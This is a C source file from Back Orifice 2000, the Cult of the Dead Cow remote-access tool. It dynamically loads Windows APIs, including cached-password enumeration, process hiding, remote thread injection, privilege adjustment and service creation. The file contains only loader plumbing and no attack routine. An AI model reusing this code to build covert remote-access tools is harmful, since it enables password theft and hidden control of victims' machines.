/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<windef.h>
#include<lmcons.h>
#include<lmshare.h>
#include<tlhelp32.h>
#include<functions.h>
#include<osversion.h>

HINSTANCE ghDll_NetApi32;
HINSTANCE ghDll_SvrApi;
HINSTANCE ghDll_Mpr;
HINSTANCE ghDll_Kernel32;
HINSTANCE ghDll_AdvApi32;

CREATESNAPSHOT pCreateToolhelp32Snapshot; 
MODULEWALK  pModule32First; 
MODULEWALK  pModule32Next; 
PROCESSWALK pProcess32First; 
PROCESSWALK pProcess32Next; 
THREADWALK  pThread32First; 
THREADWALK  pThread32Next; 
REGSERVICEPROC pRegisterServiceProcess;
CREATEREMOTETHREAD pCreateRemoteThread;
VIRTUALALLOCEX pVirtualAllocEx;
VIRTUALFREEEX pVirtualFreeEx;
VIRTUALQUERYEX pVirtualQueryEx;
VIRTUALPROTECTEX pVirtualProtectEx;

ENUMPASSWORD pWNetEnumCachedPasswords;
WNETCLOSEENUM pWNetCloseEnum;
WNETENUMRESOURCE pWNetEnumResource;
WNETOPENENUM pWNetOpenEnum;
WNETCANCELCONNECTION2 pWNetCancelConnection2;
WNETADDCONNECTION2 pWNetAddConnection2;

LMS_NETSESSIONENUM pLMSNetSessionEnum;
LMS_NETSHAREENUM pLMSNetShareEnum;
LMS_NETSHAREDEL pLMSNetShareDel;
LMS_NETSHAREADD pLMSNetShareAdd;
LMS_NETAPIBUFFERFREE pLMSNetApiBufferFree;

SVR_NETSESSIONENUM pSVRNetSessionEnum;
SVR_NETSHAREENUM pSVRNetShareEnum;
SVR_NETSHAREDEL pSVRNetShareDel;
SVR_NETSHAREADD pSVRNetShareAdd;

REGSETKEYSECURITY pRegSetKeySecurity;
SETSECURITYDESCRIPTORDACL pSetSecurityDescriptorDacl;
GETACE pGetAce;
ADDACCESSALLOWEDACE pAddAccessAllowedAce;
INITIALIZEACL pInitializeAcl;
INITIALIZESECURITYDESCRIPTOR pInitializeSecurityDescriptor;
GETLENGTHSID pGetLengthSid;
LOOKUPACCOUNTNAME pLookupAccountName;
LOOKUPACCOUNTSID pLookupAccountSid;
GETSECURITYDESCRIPTORDACL pGetSecurityDescriptorDacl;
GETSECURITYDESCRIPTORGROUP pGetSecurityDescriptorGroup;
GETSECURITYDESCRIPTOROWNER pGetSecurityDescriptorOwner;
OPENPROCESSTOKEN pOpenProcessToken;
LOOKUPPRIVILEGEVALUE pLookupPrivilegeValue;
ADJUSTTOKENPRIVILEGES pAdjustTokenPrivileges;
REGGETKEYSECURITY pRegGetKeySecurity;

OPENSCMANAGER pOpenSCManager;
CREATESERVICE pCreateService;
CLOSESERVICEHANDLE pCloseServiceHandle;
OPENSERVICE	pOpenService;
STARTSERVICECTRLDISPATCHER pStartServiceCtrlDispatcher;
REGISTERSERVICECTRLHANDLER pRegisterServiceCtrlHandler;
SETSERVICESTATUS pSetServiceStatus;
DELETESERVICE pDeleteService;
GETSERVICEDISPLAYNAME pGetServiceDisplayName;
STARTSERVICE pStartService;

int InitDynamicLibraries(void)
{
	
	if(g_bIsWinNT) {
		ghDll_NetApi32 = LoadLibrary("NETAPI32.DLL");
		if(ghDll_NetApi32==NULL) return -1;
		pLMSNetSessionEnum = (LMS_NETSESSIONENUM)GetProcAddress(ghDll_NetApi32, "NetSessionEnum");
		pLMSNetShareEnum = (LMS_NETSHAREENUM)GetProcAddress(ghDll_NetApi32, "NetShareEnum");
		pLMSNetShareDel = (LMS_NETSHAREDEL)GetProcAddress(ghDll_NetApi32, "NetShareDel");
		pLMSNetShareAdd = (LMS_NETSHAREADD)GetProcAddress(ghDll_NetApi32, "NetShareAdd");
		pLMSNetApiBufferFree = (LMS_NETAPIBUFFERFREE) GetProcAddress(ghDll_NetApi32, "NetApiBufferFree");
	} else {
		ghDll_SvrApi = LoadLibrary("SVRAPI.DLL"); 
		if(ghDll_SvrApi==NULL) return -1;
		pSVRNetSessionEnum = (SVR_NETSESSIONENUM)GetProcAddress(ghDll_SvrApi, "NetSessionEnum");
		pSVRNetShareEnum = (SVR_NETSHAREENUM)GetProcAddress(ghDll_SvrApi, "NetShareEnum");
		pSVRNetShareDel = (SVR_NETSHAREDEL)GetProcAddress(ghDll_SvrApi, "NetShareDel");
		pSVRNetShareAdd = (SVR_NETSHAREADD)GetProcAddress(ghDll_SvrApi, "NetShareAdd");
	}
		
	ghDll_Mpr=LoadLibrary("MPR.DLL");
	if(ghDll_Mpr==NULL) return -1;
	
	if(!g_bIsWinNT) {
		pWNetEnumCachedPasswords = (ENUMPASSWORD)GetProcAddress(ghDll_Mpr, "WNetEnumCachedPasswords");
	}
	
	pWNetCloseEnum = (WNETCLOSEENUM)GetProcAddress(ghDll_Mpr, "WNetCloseEnum");
	pWNetEnumResource = (WNETENUMRESOURCE)GetProcAddress(ghDll_Mpr, "WNetEnumResourceA");
	pWNetOpenEnum = (WNETOPENENUM)GetProcAddress(ghDll_Mpr, "WNetOpenEnumA");
	pWNetCancelConnection2 = (WNETCANCELCONNECTION2)GetProcAddress(ghDll_Mpr, "WNetCancelConnection2A");
	pWNetAddConnection2 = (WNETADDCONNECTION2)GetProcAddress(ghDll_Mpr, "WNetAddConnection2A");
	
	ghDll_Kernel32=LoadLibrary("KERNEL32.DLL");
	if(ghDll_Kernel32==NULL) return -1;
    
	if(!g_bIsWinNT) {
		pCreateToolhelp32Snapshot = (CREATESNAPSHOT)GetProcAddress(ghDll_Kernel32,
			"CreateToolhelp32Snapshot"); 
		
        pModule32First  = (MODULEWALK)GetProcAddress(ghDll_Kernel32, 
            "Module32First"); 
        pModule32Next   = (MODULEWALK)GetProcAddress(ghDll_Kernel32,
            "Module32Next"); 
		
        pProcess32First = (PROCESSWALK)GetProcAddress(ghDll_Kernel32, 
            "Process32First"); 
        pProcess32Next  = (PROCESSWALK)GetProcAddress(ghDll_Kernel32, 
            "Process32Next"); 
		
        pThread32First  = (THREADWALK)GetProcAddress(ghDll_Kernel32, 
            "Thread32First"); 
        pThread32Next   = (THREADWALK)GetProcAddress(ghDll_Kernel32, 
            "Thread32Next"); 
		
		pRegisterServiceProcess = (REGSERVICEPROC)GetProcAddress(ghDll_Kernel32,
			"RegisterServiceProcess");

	} else {
		pCreateRemoteThread=(CREATEREMOTETHREAD) GetProcAddress(ghDll_Kernel32,
			"CreateRemoteThread");
        pVirtualProtectEx = (VIRTUALPROTECTEX)GetProcAddress(ghDll_Kernel32, 
            "VirtualProtectEx"); 
        pVirtualAllocEx = (VIRTUALALLOCEX)GetProcAddress(ghDll_Kernel32, 
            "VirtualAllocEx"); 
        pVirtualQueryEx   = (VIRTUALQUERYEX)GetProcAddress(ghDll_Kernel32, 
            "VirtualQueryEx"); 
        pVirtualFreeEx   = (VIRTUALFREEEX)GetProcAddress(ghDll_Kernel32, 
            "VirtualFreeEx"); 
	}

	ghDll_AdvApi32=LoadLibrary("ADVAPI32.DLL");
	if(ghDll_AdvApi32==NULL) return -1;
    
	if(g_bIsWinNT) {
		pRegSetKeySecurity = (REGSETKEYSECURITY)GetProcAddress(ghDll_AdvApi32,
			"RegSetKeySecurity");
		pSetSecurityDescriptorDacl = (SETSECURITYDESCRIPTORDACL)GetProcAddress(ghDll_AdvApi32,
			"SetSecurityDescriptorDacl");
		pGetAce = (GETACE)GetProcAddress(ghDll_AdvApi32,
			"GetAce");
		pAddAccessAllowedAce = (ADDACCESSALLOWEDACE)GetProcAddress(ghDll_AdvApi32,
			"AddAccessAllowedAce");
		pInitializeAcl = (INITIALIZEACL)GetProcAddress(ghDll_AdvApi32,
			"InitializeAcl");
		pInitializeSecurityDescriptor = (INITIALIZESECURITYDESCRIPTOR)GetProcAddress(ghDll_AdvApi32,
			"InitializeSecurityDescriptor");
		pGetLengthSid = (GETLENGTHSID)GetProcAddress(ghDll_AdvApi32,
			"GetLengthSid");
		pLookupAccountName = (LOOKUPACCOUNTNAME)GetProcAddress(ghDll_AdvApi32,
			"LookupAccountNameA");
		pLookupAccountSid = (LOOKUPACCOUNTSID)GetProcAddress(ghDll_AdvApi32,
			"LookupAccountSidA");
		pGetSecurityDescriptorDacl = (GETSECURITYDESCRIPTORDACL)GetProcAddress(ghDll_AdvApi32,
			"GetSecurityDescriptorDacl");
		pGetSecurityDescriptorGroup = (GETSECURITYDESCRIPTORGROUP)GetProcAddress(ghDll_AdvApi32,
			"GetSecurityDescriptorGroup");
		pGetSecurityDescriptorOwner = (GETSECURITYDESCRIPTOROWNER)GetProcAddress(ghDll_AdvApi32,
			"GetSecurityDescriptorOwner");
		pOpenProcessToken = (OPENPROCESSTOKEN)GetProcAddress(ghDll_AdvApi32,
			"OpenProcessToken");
		pLookupPrivilegeValue = (LOOKUPPRIVILEGEVALUE)GetProcAddress(ghDll_AdvApi32,
			"LookupPrivilegeValueA");
		pAdjustTokenPrivileges = (ADJUSTTOKENPRIVILEGES)GetProcAddress(ghDll_AdvApi32,
			"AdjustTokenPrivileges");
		pRegGetKeySecurity = (REGGETKEYSECURITY)GetProcAddress(ghDll_AdvApi32,
			"RegGetKeySecurity");

		pOpenSCManager=(OPENSCMANAGER) GetProcAddress(ghDll_AdvApi32,
			"OpenSCManagerA");
		pCreateService=(CREATESERVICE) GetProcAddress(ghDll_AdvApi32,
			"CreateServiceA");
		pCloseServiceHandle=(CLOSESERVICEHANDLE) GetProcAddress(ghDll_AdvApi32,
			"CloseServiceHandle");
		pOpenService=(OPENSERVICE) GetProcAddress(ghDll_AdvApi32,
			"OpenServiceA");
		pStartServiceCtrlDispatcher=(STARTSERVICECTRLDISPATCHER) GetProcAddress(ghDll_AdvApi32,
			"StartServiceCtrlDispatcherA");
		pRegisterServiceCtrlHandler=(REGISTERSERVICECTRLHANDLER) GetProcAddress(ghDll_AdvApi32,
			"RegisterServiceCtrlHandlerA");
		pSetServiceStatus=(SETSERVICESTATUS) GetProcAddress(ghDll_AdvApi32,
			"SetServiceStatus");
		pDeleteService=(DELETESERVICE) GetProcAddress(ghDll_AdvApi32,
			"DeleteService");
		pGetServiceDisplayName=(GETSERVICEDISPLAYNAME) GetProcAddress(ghDll_AdvApi32,
			"GetServiceDisplayNameA");
		pStartService=(STARTSERVICE) GetProcAddress(ghDll_AdvApi32,
			"StartServiceA");
	}

	
	return 0;
}


int KillDynamicLibraries(void)
{
	if(ghDll_AdvApi32!=NULL) 
		FreeLibrary(ghDll_AdvApi32);
	if(ghDll_Kernel32!=NULL) 
		FreeLibrary(ghDll_Kernel32);
	if(ghDll_Mpr!=NULL) 
		FreeLibrary(ghDll_Mpr);
	if(ghDll_NetApi32!=NULL) 
		FreeLibrary(ghDll_NetApi32);
	if(ghDll_SvrApi!=NULL) 
		FreeLibrary(ghDll_SvrApi);

	return 0;
}
